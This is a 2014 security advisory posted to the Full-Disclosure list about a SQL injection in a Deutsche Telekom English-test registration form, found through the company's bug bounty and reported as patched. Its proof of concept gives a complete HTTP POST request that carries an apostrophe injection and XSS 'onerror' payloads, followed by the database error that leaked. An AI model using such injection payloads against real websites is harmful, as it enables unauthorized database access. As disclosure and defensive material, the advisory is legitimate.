
Date: Thu, 06 Feb 2014 14:35:20 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: full-disclosure@...ts.grok.org.uk
Subject: German Telekom Bug Bounty #11 - Remote SQL
	Injection Vulnerability

Document Title:
===============
German Telekom Bug Bounty #11 - Remote SQL Injection Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1177

Dev Article: http://www.vulnerability-db.com/dev/index.php/2014/02/06/german-telekom-bug-bounty-3x-remote-vulnerabilities/

Exclusive News: http://news.softpedia.com/news/Expert-Finds-SQL-Injection-and-RCE-Vulnerabilities-in-Deutsche-Telekom-Systems-424518.shtml


Release Date:
=============
2014-02-06


Vulnerability Laboratory ID (VL-ID):
====================================
1177


Common Vulnerability Scoring System:
====================================
8.3


Product & Service Introduction:
===============================
Deutsche Telekom AG (English: German Telecom) is a German telecommunications company headquartered in Bonn, 
North Rhine-Westphalia, Germany. Deutsche Telekom was formed in 1996 as the former state-owned monopoly 
Deutsche Bundespost was privatized. As of June 2008, the German government still holds a 15% stake in company 
stock directly, and another 17% through the government bank KfW.

(Copy of the Homepage: http://en.wikipedia.org/wiki/Deutsche_Telekom  &  http://www.telekom.com/bug-bounty  )


Abstract Advisory Information:
==============================
The Vulnerability Laboratory Research Team discovered a remote SQL Injection web vulnerability in the official Telekom website web-application.


Vulnerability Disclosure Timeline:
==================================
2013-12-30: Researcher Notification & Coordination (Ibrahim Mosaad El-Sayed)
2013-12-30: Vendor Notification (Telekom CERT Security Team)
2014-01-02: Vendor Response/Feedback (Telekom CERT Security Team)
2014-01-24: Vendor Fix/Patch (Telekom Developer Team - Reward 1000€)
2014-02-06: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Critical


Technical Details & Description:
================================
A remote SQL Injection web vulnerability has been discovered in the official Telekom (English) Fitness Check website web application.
The vulnerability allows remote attackers to inject unauthorized own sql statements to compromise the affected web-application or dbms.

The sql injection vulnerability is located in `englishtest2004/test.asp` file of the englishtest2004 module (path). After executing 
the query through the test.asp page, the query`s result can be seen from a `500 error` returned by the `test.asp` page. The connected 
vulnerable parameter in the `test.aspx` file is `mailbody` that is passed through the POST method request. The SQL injection bug is in 
the INSERT statement. Other paramaters like VORNAME, Email, PLZ, TELEFON can be accessed by usage of a malicious insert statement. 

The security risk of the sql injection vulnerability is estimated as critical with a cvss (common vulnerability scoring system) count of 8.3(+).

Exploitation of the remote sql injection web vulnerability requires NO user interaction or a privileged web-application user account.
Successful exploitation of the remote pre-auth sql injection results in dbms, web-server and web-application (context) compromise.

Vulnerable Module(s):
				[+] /englishtest2004/

Vulnerable File(s):
				[+] /englishtest2004/test.asp
        
Vulnerable Parameter(s):
				[+] mailbody


Proof of Concept (PoC):
=======================
The SQL injection vulnerability can be exploited by remote attackers without privileged application user account and without required user inter action. For demonstration or reproduce ...

a) The attacker should visit the main page to take the test
    https://gt.telekom.de/englishtest2004eng/html/intro.htm
b) The attacker should keep clicking on next until he reaches the final step in the test which is the page of  "Registration for the Fitness Check"
c) In the form of registering the test, we have many fields.
We fill the  up the vulnerable fields and then click on "Register" button

d) The attacker then should intercept the request and edit the "mailbody" paremter to an apsrophe that will generate the SQL error 

e) After forwarding the request, we will find the SQL error in the INSERT statement echoed back in the page

The post request that has been used to reproduce the image is:

POST /englishtest2004/test.asp HTTP/1.1
Host: gt.telekom.de
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:25.0) Gecko/20100101 Firefox/25.0
Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: https://gt.telekom.de/englishtest2004/html/intro_11.htm
Cookie: _ga=GA1.2.1524944686.1388633141; ASPSESSIONIDQAQRBTRB=PJJNFNFCCPEDGGLMFOGEGNGK
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 483

response=/englishtest2004/html/starttest.htm&to=hans-juergen.grunwald@...ekom.de&from=&subject=Fokus_Sprachen_&_Seminare-Login&smtphost=localhost&mailbody='&NAME="><img src=x onerror=alert(1)>&VORNAME="><img src=x onerror=alert(1)>&PLZ="><img src=x onerror=alert(1)>&EMAIL="><img src=x onerror=alert(1)>&TELEFON="><img src=x onerror=alert(1)>&ORT="><img src=x onerror=alert(1)>


After forwarding the post request, a response will be received from the server similar to this:

HTTP/1.1 500 Internal Server Error
Date: Thu, 02 Jan 2014 03:49:47 GMT
Server: Microsoft-IIS/6.0
X-UA-Compatible: IE=EmulateIE7
X-Powered-By: ASP.NET
Content-Length: 572
Content-Type: text/html
Cache-control: private

insert into  Sprachtest(Name, Vorname,PersNr,Telefon,Fax, Ergebnis)VALUES ('"><img src=x onerror=alert(1)>','"><img src=x onerror=alert(1)>','','"><img src=x onerror ',' ','''); <font face="Arial" size=2>
<p>Microsoft OLE DB Provider for ODBC Drivers</font> <font face="Arial" size=2>error '80040e14'</font>
<p>
<font face="Arial" size=2>[Microsoft][ODBC SQL Server Driver][SQL Server]Kein schließendes Anführungszeichen nach der Zeichenfolge '');'.</font>
<p>
<font face="Arial" size=2>/englishtest2004/test.asp</font><font face="Arial" size=2>, line 23</font> 


Solution - Fix & Patch:
=======================
The vulnerability can be patched by the implement of a prepared statement in the unsecure location request.
Encode the vulnerable filetypes and filelist parameter to prevent further injection attacks.



Security Risk:
==============
The security risk of the remote sql injection web vulnerability is estimated as critical with a cvss count of 8.3.


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Ibrahim Mosaad El-Sayed (ibrahim@...lution-sec.com) [www.vulnerability-lab.com]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases 
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       - admin@...lution-sec.com
Section:    www.vulnerability-lab.com/dev 	- forum.vulnerability-db.com 		       - magazine.vulnerability-db.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other 
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and 
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), 
modify, use or edit our material contact (admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright © 2014 | Vulnerability Laboratory [Evolution Security]



-- 
VULNERABILITY LABORATORY RESEARCH TEAM
DOMAIN: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
